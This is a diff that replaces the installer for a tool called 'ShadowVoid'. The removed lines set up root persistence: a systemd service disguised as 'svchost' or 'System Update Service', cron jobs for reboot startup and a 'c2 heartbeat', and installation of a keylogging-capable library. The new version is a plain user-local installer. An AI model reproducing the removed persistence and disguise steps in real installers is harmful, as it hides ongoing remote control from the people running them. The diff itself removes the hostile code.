@@ -1,88 +1,32 @@
-#!/bin/bash
-# ShadowVoid Framework Installer v1.0.0-alpha
-# Silent installation script
-# Zero footprint, self-cleaning
+#!/usr/bin/env bash
+# Install the local, safe ShadowVoid CLI for the current user.
+# This script intentionally does not require root, create services, alter cron,
+# delete history, or establish persistence.
 
-set -e
+set -euo pipefail
 
-REPO_URL="https://github.com/mraaisa-afk/shadow-void"
-INSTALL_DIR="/opt/shadowvoid"
-BIN_DIR="/usr/local/bin"
-TEMP_DIR=$(mktemp -d)
-SERVICE_NAME="svchost"
+SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
+INSTALL_DIR="${SHADOWVOID_INSTALL_DIR:-${HOME}/.local/share/shadowvoid}"
+BIN_DIR="${SHADOWVOID_BIN_DIR:-${HOME}/.local/bin}"
 
-RED="\\033[0;31m"
-GREEN="\\033[0;32m"
-YELLOW="\\033[1;33m"
-NC="\\033[0m"
-
-cleanup() {
-    rm -rf "$TEMP_DIR"
-    echo -e "${GREEN}[+] Cleanup complete${NC}"
-}
-
-trap cleanup EXIT
-
-if [ "$(id -u)" -ne 0 ]; then
-    echo -e "${RED}[!] This script must be run as root${NC}"
+if ! command -v python3 >/dev/null 2>&1; then
+    printf 'python3 is required but was not found\n' >&2
     exit 1
 fi
 
-echo -e "${YELLOW}[*] Checking dependencies...${NC}"
-for dep in git python3 python3-pip curl wget; do
-    if ! command -v "$dep" &> /dev/null; then
-        echo -e "${RED}[!] Missing dependency: $dep${NC}"
-        apt-get update -qq 2>/dev/null
-        apt-get install -y -qq "$dep" 2>/dev/null
-    fi
-done
+mkdir -p "$INSTALL_DIR" "$BIN_DIR"
 
-echo -e "${YELLOW}[*] Creating installation directory...${NC}"
-mkdir -p "$INSTALL_DIR"
+# Copy source files only; generated caches and repository metadata are excluded.
+find "$SCRIPT_DIR" -maxdepth 1 -type f \( -name '*.py' -o -name '*.yaml' -o -name '*.txt' \) -exec cp -- {} "$INSTALL_DIR/" \;
+mkdir -p "$INSTALL_DIR/modules"
+find "$SCRIPT_DIR/modules" -maxdepth 1 -type f -name '*.py' -exec cp -- {} "$INSTALL_DIR/modules/" \;
 
-echo -e "${YELLOW}[*] Cloning repository...${NC}"
-cd "$TEMP_DIR"
-git clone --depth 1 "$REPO_URL" shadowvoid-repo > /dev/null 2>&1
-
-echo -e "${YELLOW}[*] Copying files...${NC}"
-cp -r shadowvoid-repo/* "$INSTALL_DIR/"
-chmod -R 700 "$INSTALL_DIR"
-
-echo -e "${YELLOW}[*] Installing Python dependencies...${NC}"
-cd "$INSTALL_DIR"
-pip3 install pycryptodome requests pynput -q 2>/dev/null
-
-echo -e "${YELLOW}[*] Creating symlinks...${NC}"
-ln -sf "$INSTALL_DIR/loader.py" "$BIN_DIR/sv-loader"
-ln -sf "$INSTALL_DIR/core.py" "$BIN_DIR/sv"
-
-echo -e "${YELLOW}[*] Creating systemd service...${NC}"
-cat > /etc/systemd/system/$SERVICE_NAME.service << EOF
-[Unit]
-Description=System Update Service
-After=network.target
-
-[Service]
-Type=simple
-ExecStart=$BIN_DIR/sv init
-Restart=always
-RestartSec=30
-User=root
-WorkingDirectory=$INSTALL_DIR
-
-[Install]
-WantedBy=multi-user.target
+cat > "$BIN_DIR/shadowvoid" <<EOF
+#!/usr/bin/env bash
+exec python3 "$INSTALL_DIR/shadowvoid.py" "\$@"
 EOF
+chmod 755 "$BIN_DIR/shadowvoid"
 
-systemctl daemon-reload > /dev/null 2>&1
-systemctl enable $SERVICE_NAME.service > /dev/null 2>&1
-systemctl start $SERVICE_NAME.service > /dev/null 2>&1
-
-echo -e "${YELLOW}[*] Creating persistence...${NC}"
-(crontab -l 2>/dev/null; echo "@reboot $BIN_DIR/sv init") | crontab -
-(crontab -l 2>/dev/null; echo "*/30 * * * * $BIN_DIR/sv c2 heartbeat") | crontab -
-
-echo -e "${GREEN}[+] Installation complete!${NC}"
-echo -e "${GREEN}[+] ShadowVoid Framework is ready${NC}"
-echo -e "${GREEN}[+] Run: sv help${NC}"
-echo -e "${GREEN}[+] Service: $SERVICE_NAME${NC}"
+printf 'Installed safe ShadowVoid to %s\n' "$INSTALL_DIR"
+printf 'Run: %s/shadowvoid help\n' "$BIN_DIR"
+printf 'No services, cron jobs, or persistence were created.\n'
